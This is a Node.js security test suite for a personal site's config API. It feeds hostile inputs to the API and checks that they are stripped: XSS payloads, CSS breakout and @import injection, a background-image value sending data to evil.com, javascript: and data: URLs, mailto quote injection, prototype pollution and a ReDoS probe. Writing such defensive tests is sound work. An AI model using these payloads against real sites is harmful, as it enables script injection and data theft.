const assert = require('assert');
const Module = require('module');
const path = require('path');

const originalResolve = Module._resolveFilename;
const mockBlobPath = path.resolve(__dirname, 'test-mock-blob.js');

Module._resolveFilename = function(request) {
    if (request === '@vercel/blob') return mockBlobPath;
    return originalResolve.apply(this, arguments);
};

global.fetch = async function(url, opts) {
    if (url && url.startsWith('mock://')) {
        const key = url.replace('mock://', '');
        const data = require('./test-mock-blob.js')._getStore()[key];
        if (data) return { ok: true, json: async () => JSON.parse(data), status: 200 };
        return { ok: false, status: 404 };
    }
    return { ok: false, status: 404 };
};

const handler = require('./api/config.js');
Module._resolveFilename = originalResolve;

function req(method, body, token) {
    const r = { method, headers: {} };
    if (body) r.body = typeof body === 'string' ? body : JSON.stringify(body);
    if (token) r.headers['authorization'] = 'Bearer ' + token;
    return r;
}

function res() {
    let _s = 200, _b = null, _e = false; const _h = {};
    const r = {
        setHeader: (k, v) => { _h[k] = v; },
        status: (c) => { _s = c; return r; },
        json: (d) => { _b = d; _e = true; return r; },
        end: () => { _e = true; },
        get statusCode() { return _s; },
        get body() { return _b; },
        get ended() { return _e; },
        get hdrs() { return _h; }
    };
    return r;
}

let P = 0, F = 0, T = 0;
let failures = [];

async function test(name, fn) {
    T++;
    try {
        require('./test-mock-blob.js')._reset();
        await fn();
        P++;
        console.log(`  ✓ ${name}`);
    } catch (e) {
        F++;
        failures.push(name + ': ' + e.message);
        console.log(`  ✗ ${name}`);
        console.log(`    ${e.message}`);
    }
}

const VALID_TOKEN = 'a'.repeat(64);

async function seedSession(token) {
    const mockBlob = require('./test-mock-blob.js');
    const session = { token: token, createdAt: Date.now(), expiresAt: Date.now() + 86400000 };
    await mockBlob.put('sessions/' + token + '.json', JSON.stringify(session));
}

function baseConfig() {
    return {
        version: 0,
        theme: { light: { bg: '#ece7dd' }, dark: { bg: '#1c1e20' } },
        hero: { names: ['UD'], subtitle: 'test', nameCyclingInterval: 3000 },
        about: { label: 'About', html: '<p>Hello</p>' },
        skills: { label: 'Skills', categories: [{ title: 'Frontend', color: '#3178c6', items: [{ icon: 'https://cdn.example.com/icon.svg', label: 'React' }] }] },
        contact: { label: 'Contact', email: 'test@test.com', links: [{ label: 'GitHub', url: 'https://github.com', icon: 'github' }] },
        footer: { copyright: '© 2026', showVisitorCounter: true },
        navigation: { logo: 'T.', items: [{ label: 'About', href: '#about' }] },
        fireflies: { count: { hero: 6, about: 3, skills: 3, contact: 3 }, lightColors: ['#d4a574ee'], darkColors: ['#3b82f6bb'] },
        cursor: { enabled: true, dotSize: 8, ringSize: 40, color: '#ffffff', blendMode: 'difference' },
        projects: { maxPerGroup: 50, sortOrder: 'manual' },
        seo: { title: 'Test', description: 'Desc', ogImage: 'https://example.com/og.png', siteUrl: 'https://example.com', robots: 'noindex' }
    };
}

async function postConfig(cfg) {
    await seedSession(VALID_TOKEN);
    const r = req('POST', cfg);
    r.headers['authorization'] = 'Bearer ' + VALID_TOKEN;
    const s = res();
    await handler(r, s);
    return s;
}

async function getStoredConfig() {
    const mockBlob = require('./test-mock-blob.js');
    const raw = mockBlob._getStore()['config.json'];
    return raw ? JSON.parse(raw) : null;
}

(async function() {
    console.log('\n🔒 Security Tests — Config API\n');

    // ═══════════════════════════════════════════
    // 1. XSS via about.html
    // ═══════════════════════════════════════════
    console.log('\n--- XSS: about.html ---');

    await test('about.html: <img onerror=...> should be stripped', async () => {
        const cfg = baseConfig();
        cfg.about.html = '<img src=x onerror="alert(1)">';
        const s = await postConfig(cfg);
        assert.strictEqual(s.statusCode, 200);
        const stored = await getStoredConfig();
        assert.ok(!stored.about.html.includes('onerror'), 'onerror handler should be stripped: ' + stored.about.html);
        assert.ok(!stored.about.html.includes('<img'), 'img tag should be stripped: ' + stored.about.html);
    });

    await test('about.html: <svg onload=...> should be stripped', async () => {
        const cfg = baseConfig();
        cfg.about.html = '<svg onload="alert(1)"><rect width="100" height="100"/></svg>';
        const s = await postConfig(cfg);
        assert.strictEqual(s.statusCode, 200);
        const stored = await getStoredConfig();
        assert.ok(!stored.about.html.includes('onload'), 'onload should be stripped: ' + stored.about.html);
        assert.ok(!stored.about.html.includes('<svg'), 'svg tag should be stripped: ' + stored.about.html);
    });

    await test('about.html: <iframe> should be stripped', async () => {
        const cfg = baseConfig();
        cfg.about.html = '<iframe src="https://evil.com"></iframe>';
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.ok(!stored.about.html.includes('<iframe'), 'iframe should be stripped: ' + stored.about.html);
    });

    await test('about.html: <style> injection should be stripped', async () => {
        const cfg = baseConfig();
        cfg.about.html = '<style>body{display:none}</style>text';
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.ok(!stored.about.html.includes('<style'), 'style tag should be stripped: ' + stored.about.html);
    });

    await test('about.html: <form action=...> should be stripped', async () => {
        const cfg = baseConfig();
        cfg.about.html = '<form action="https://evil.com"><input type="submit"/></form>';
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.ok(!stored.about.html.includes('<form'), 'form should be stripped: ' + stored.about.html);
        assert.ok(!stored.about.html.includes('<input'), 'input should be stripped: ' + stored.about.html);
    });

    await test('about.html: mixed case <ScRiPt> bypass', async () => {
        const cfg = baseConfig();
        cfg.about.html = '<ScRiPt>alert(1)</ScRiPt>safe text';
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.ok(!stored.about.html.toLowerCase().includes('<script'), 'mixed case script should be stripped: ' + stored.about.html);
    });

    await test('about.html: event handler on safe tag (onmouseover)', async () => {
        const cfg = baseConfig();
        cfg.about.html = '<span onmouseover="alert(1)">hover me</span>';
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.ok(!stored.about.html.includes('onmouseover'), 'onmouseover should be stripped: ' + stored.about.html);
    });

    await test('about.html: safe tags (span, b, em, br) should be preserved', async () => {
        const cfg = baseConfig();
        cfg.about.html = '<span class="highlight-phrase"><b>Bold</b> and <em>italic</em><br/>line</span>';
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.ok(stored.about.html.includes('<span'), 'span should be preserved');
        assert.ok(stored.about.html.includes('<b>'), 'b should be preserved');
        assert.ok(stored.about.html.includes('<em>'), 'em should be preserved');
        assert.ok(stored.about.html.includes('highlight-phrase'), 'class should be preserved on safe tags');
    });

    // ═══════════════════════════════════════════
    // 2. CSS Injection via theme values
    // ═══════════════════════════════════════════
    console.log('\n--- CSS Injection: theme values ---');

    await test('theme: CSS rule breakout via } should be rejected', async () => {
        const cfg = baseConfig();
        cfg.theme.light.bg = '} body { display: none !important; }';
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.ok(!stored.theme.light.bg.includes('}'), 'CSS breakout should be prevented: ' + stored.theme.light.bg);
    });

    await test('theme: CSS expression() should be rejected', async () => {
        const cfg = baseConfig();
        cfg.theme.light.bg = 'expression(alert(1))';
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.ok(!stored.theme.light.bg.toLowerCase().includes('expression'), 'expression() should be rejected: ' + stored.theme.light.bg);
    });

    await test('theme: CSS url() with javascript: should be rejected', async () => {
        const cfg = baseConfig();
        cfg.theme.light.bg = 'url(javascript:alert(1))';
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.ok(!stored.theme.light.bg.toLowerCase().includes('javascript'), 'javascript: in url() should be rejected: ' + stored.theme.light.bg);
    });

    await test('theme: semicolon injection should be rejected', async () => {
        const cfg = baseConfig();
        cfg.theme.light.bg = 'red; background-image: url(http://evil.com/steal?data=';
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.ok(!stored.theme.light.bg.includes(';'), 'semicolon should be rejected: ' + stored.theme.light.bg);
    });

    await test('theme: valid CSS color values should be accepted', async () => {
        const cfg = baseConfig();
        cfg.theme.light.bg = '#ff0000';
        cfg.theme.light.fg = 'rgba(255, 0, 0, 0.5)';
        const s = await postConfig(cfg);
        assert.strictEqual(s.statusCode, 200);
        const stored = await getStoredConfig();
        assert.strictEqual(stored.theme.light.bg, '#ff0000');
        assert.strictEqual(stored.theme.light.fg, 'rgba(255, 0, 0, 0.5)');
    });

    // ═══════════════════════════════════════════
    // 3. Skill icon URL injection
    // ═══════════════════════════════════════════
    console.log('\n--- Skill icon URL injection ---');

    await test('skill icon: data:text/html should be rejected', async () => {
        const cfg = baseConfig();
        cfg.skills.categories = [{ title: 'Test', color: '#ff0000', items: [{ icon: 'data:text/html,<script>alert(1)</script>', label: 'XSS' }] }];
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        const icons = stored.skills.categories[0].items.map(i => i.icon);
        assert.ok(!icons.some(i => i.startsWith('data:text/html')), 'data:text/html should be rejected');
    });

    await test('skill icon: javascript: URL should be rejected', async () => {
        const cfg = baseConfig();
        cfg.skills.categories = [{ title: 'Test', color: '#ff0000', items: [{ icon: 'javascript:alert(1)', label: 'XSS' }] }];
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        const icons = stored.skills.categories[0].items.map(i => i.icon);
        assert.ok(!icons.some(i => i.startsWith('javascript:')), 'javascript: should be rejected');
    });

    await test('skill icon: valid https URL should be accepted', async () => {
        const cfg = baseConfig();
        cfg.skills.categories = [{ title: 'Test', color: '#ff0000', items: [{ icon: 'https://cdn.simpleicons.org/react/61DAFB', label: 'React' }] }];
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.strictEqual(stored.skills.categories[0].items[0].icon, 'https://cdn.simpleicons.org/react/61DAFB');
    });

    await test('skill icon: data:image/svg+xml should be accepted', async () => {
        const cfg = baseConfig();
        cfg.skills.categories = [{ title: 'Test', color: '#ff0000', items: [{ icon: "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='red' d='M12 2z'/></svg>", label: 'SVG' }] }];
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.ok(stored.skills.categories[0].items[0].icon.startsWith('data:image/svg+xml'), 'data:image/svg+xml should be accepted');
    });

    await test('skill icon: lucide: prefix should be accepted', async () => {
        const cfg = baseConfig();
        cfg.skills.categories = [{ title: 'Test', color: '#ff0000', items: [{ icon: 'lucide:webhook', label: 'Webhook' }] }];
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.strictEqual(stored.skills.categories[0].items[0].icon, 'lucide:webhook');
    });

    // ═══════════════════════════════════════════
    // 4. Navigation href injection
    // ═══════════════════════════════════════════
    console.log('\n--- Navigation href injection ---');

    await test('nav href: javascript: should be rejected', async () => {
        const cfg = baseConfig();
        cfg.navigation.items = [{ label: 'Evil', href: 'javascript:alert(1)' }];
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        const hrefs = stored.navigation.items.map(i => i.href);
        assert.ok(!hrefs.some(h => h.startsWith('javascript:')), 'javascript: href should be rejected');
    });

    await test('nav href: data: URL should be rejected', async () => {
        const cfg = baseConfig();
        cfg.navigation.items = [{ label: 'Evil', href: 'data:text/html,<script>alert(1)</script>' }];
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        const hrefs = stored.navigation.items.map(i => i.href);
        assert.ok(!hrefs.some(h => h.startsWith('data:')), 'data: href should be rejected');
    });

    await test('nav href: #anchor should be accepted', async () => {
        const cfg = baseConfig();
        cfg.navigation.items = [{ label: 'About', href: '#about' }];
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.strictEqual(stored.navigation.items[0].href, '#about');
    });

    await test('nav href: https:// URL should be accepted', async () => {
        const cfg = baseConfig();
        cfg.navigation.items = [{ label: 'Blog', href: 'https://blog.example.com' }];
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.strictEqual(stored.navigation.items[0].href, 'https://blog.example.com');
    });

    // ═══════════════════════════════════════════
    // 5. Contact email injection
    // ═══════════════════════════════════════════
    console.log('\n--- Contact email injection ---');

    await test('email: HTML injection should be stripped', async () => {
        const cfg = baseConfig();
        cfg.contact.email = '<b>evil</b>@test.com';
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.ok(!stored.contact.email.includes('<b>'), 'HTML should be stripped from email: ' + stored.contact.email);
    });

    await test('email: " injection in mailto should be sanitized', async () => {
        const cfg = baseConfig();
        cfg.contact.email = 'test@test.com"onclick="alert(1)';
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.ok(!stored.contact.email.includes('"'), 'quotes should be stripped from email: ' + stored.contact.email);
    });

    // ═══════════════════════════════════════════
    // 6. OG image SVG injection
    // ═══════════════════════════════════════════
    console.log('\n--- OG image SVG injection ---');

    await test('SEO title: SVG/XML elements should be stripped', async () => {
        const cfg = baseConfig();
        cfg.seo.title = 'Test<rect width="100"/>injection';
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.ok(!stored.seo.title.includes('<rect'), 'SVG elements should be stripped from SEO title');
        assert.ok(stored.seo.title.includes('Test'), 'safe text should be preserved');
        assert.ok(stored.seo.title.includes('injection'), 'text after stripped tag should be preserved');
    });

    // ═══════════════════════════════════════════
    // 7. Prototype pollution
    // ═══════════════════════════════════════════
    console.log('\n--- Prototype pollution ---');

    await test('config: __proto__ key should not pollute', async () => {
        const cfg = baseConfig();
        cfg.__proto__ = { polluted: true };
        const s = await postConfig(cfg);
        assert.strictEqual(s.statusCode, 200);
        const stored = await getStoredConfig();
        assert.strictEqual(({}).polluted, undefined, 'Object.prototype should not be polluted');
    });

    await test('config: constructor key should be harmless', async () => {
        const cfg = baseConfig();
        cfg.constructor = { prototype: { hacked: true } };
        const s = await postConfig(cfg);
        assert.strictEqual(s.statusCode, 200);
        assert.strictEqual(({}).hacked, undefined, 'constructor pollution should be harmless');
    });

    // ═══════════════════════════════════════════
    // 8. Edge cases / advanced bypass attempts
    // ═══════════════════════════════════════════
    console.log('\n--- Edge cases / advanced bypass ---');

    await test('about.html: nested dangerous tags', async () => {
        const cfg = baseConfig();
        cfg.about.html = '<div><script>alert(1)</script><iframe src=x></iframe><form><input type=submit></form>safe</div>';
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.ok(!stored.about.html.includes('<script'), 'nested script stripped');
        assert.ok(!stored.about.html.includes('<iframe'), 'nested iframe stripped');
        assert.ok(!stored.about.html.includes('<form'), 'nested form stripped');
        assert.ok(!stored.about.html.includes('<div'), 'div not in whitelist');
        assert.ok(stored.about.html.includes('safe'), 'safe text preserved');
    });

    await test('about.html: multiple event handlers on one tag', async () => {
        const cfg = baseConfig();
        cfg.about.html = '<span onmouseover="a()" onclick="b()" onfocus="c()">text</span>';
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.ok(!stored.about.html.includes('onmouseover'), 'onmouseover stripped');
        assert.ok(!stored.about.html.includes('onclick'), 'onclick stripped');
        assert.ok(!stored.about.html.includes('onfocus'), 'onfocus stripped');
        assert.ok(stored.about.html.includes('<span'), 'span preserved');
        assert.ok(stored.about.html.includes('text'), 'text preserved');
    });

    await test('about.html: self-closing dangerous tag', async () => {
        const cfg = baseConfig();
        cfg.about.html = '<script src="https://evil.com/xss.js"/><style>@import url(evil);</style>ok';
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.ok(!stored.about.html.includes('<script'), 'self-closing script stripped');
        assert.ok(!stored.about.html.includes('<style'), 'self-closing style stripped');
        assert.ok(stored.about.html.includes('ok'), 'safe text preserved');
    });

    await test('about.html: mixed case dangerous tags', async () => {
        const cfg = baseConfig();
        cfg.about.html = '<ScRiPt>alert(1)</ScRiPt><IfRaMe src=x></IfRaMe>safe';
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.ok(!stored.about.html.toLowerCase().includes('<script'), 'mixed case script stripped');
        assert.ok(!stored.about.html.toLowerCase().includes('<iframe'), 'mixed case iframe stripped');
        assert.ok(stored.about.html.includes('safe'), 'safe text preserved');
    });

    await test('about.html: unquoted event handler', async () => {
        const cfg = baseConfig();
        cfg.about.html = '<span onmouseover=alert(1)>text</span>';
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.ok(!stored.about.html.includes('onmouseover'), 'unquoted event handler stripped');
    });

    await test('theme: null byte in CSS value', async () => {
        const cfg = baseConfig();
        cfg.theme.light.bg = '#ff0000\0; background-image: url(evil)';
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.ok(!stored.theme.light.bg.includes('\0'), 'null byte rejected');
        assert.ok(!stored.theme.light.bg.includes('url'), 'url() rejected');
    });

    await test('theme: @import injection', async () => {
        const cfg = baseConfig();
        cfg.theme.light.bg = 'red } @import url(https://evil.com/xss.css); {';
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.ok(!stored.theme.light.bg.includes('@import'), '@import rejected');
        assert.ok(!stored.theme.light.bg.includes('}'), 'braces rejected');
    });

    await test('skill icon: empty string falls back to defaults', async () => {
        const cfg = baseConfig();
        cfg.skills.categories = [{ title: 'Test', color: '#ff0000', items: [{ icon: '', label: 'Empty' }] }];
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.strictEqual(stored.skills.categories.length, 4, 'empty icon → item dropped → empty category → fallback to defaults');
    });

    await test('nav href: relative path accepted', async () => {
        const cfg = baseConfig();
        cfg.navigation.items = [{ label: 'Page', href: '/about' }];
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.strictEqual(stored.navigation.items[0].href, '/about');
    });

    await test('email: default fallback on invalid email', async () => {
        const cfg = baseConfig();
        cfg.contact.email = 'not-an-email';
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.strictEqual(stored.contact.email, 'dev.udss2650@gmail.com', 'invalid email falls back to default');
    });

    await test('about.html: deeply nested safe tags preserved', async () => {
        const cfg = baseConfig();
        cfg.about.html = '<span><b><em><strong>deep</strong></em></b></span>';
        const s = await postConfig(cfg);
        const stored = await getStoredConfig();
        assert.ok(stored.about.html.includes('<span>'), 'span preserved');
        assert.ok(stored.about.html.includes('<strong>deep</strong>'), 'nested safe tags preserved');
    });

    await test('ReDoS: long input does not hang', async () => {
        const cfg = baseConfig();
        cfg.about.html = '<span ' + 'onmouseover="x" '.repeat(100) + '>text</span>';
        const start = Date.now();
        const s = await postConfig(cfg);
        const elapsed = Date.now() - start;
        assert.ok(elapsed < 5000, 'should complete in <5s, took ' + elapsed + 'ms');
        const stored = await getStoredConfig();
        assert.ok(!stored.about.html.includes('onmouseover'), 'all handlers stripped');
    });

    // ═══════════════════════════════════════════
    // Summary
    // ═══════════════════════════════════════════
    console.log(`\n  Results: ${P} passed, ${F} failed, ${T} total`);
    if (failures.length) {
        console.log('\n  Failures:');
        failures.forEach(f => console.log('    - ' + f));
    }
    console.log('');
    if (F > 0) process.exit(1);
})();
